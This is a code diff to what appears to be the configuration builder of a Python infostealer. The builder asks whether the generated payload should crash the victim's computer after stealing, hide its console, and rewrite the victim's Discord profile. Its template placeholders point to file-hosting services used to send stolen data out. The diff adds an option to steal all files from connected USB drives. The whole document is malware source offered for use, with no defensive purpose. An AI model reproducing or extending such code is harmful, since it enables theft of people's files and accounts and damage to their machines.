@@ -147,6 +147,7 @@ while True:
     crasher = get_boolean_input('Do you want the program to make the computer crash after it stole everything? Y/N: ')
     hide = get_boolean_input('Do you want the program to make the console invisible? Y/N: ')
     change = get_boolean_input('Do you want to change the user (discord account) about me with custom text? Y/N: ')
+    Drive = get_boolean_input('Do you want to steal all connected USB files (may make the stealer slower) Y/N')
     if change:
         bio = input(r'''Input the text you want the user to have in his about me (Right-click to paste) or put \n to skip a line -> ''')
 
@@ -206,6 +207,8 @@ while True:
     new_content = new_content.replace("'%GoFileYesOrNo%'", str(gofile))
     new_content = new_content.replace("'%FileIOYesOrNo%'", str(fileio))
     new_content = new_content.replace("'%CatBoxMoeYesOrNo%'", str(catbox))
+    new_content = new_content.replace("'%Drive%'", str(Drive))
+    
     if change:
         new_content = new_content.replace("'%Text%'", str(f"'''{bio}'''"))
 
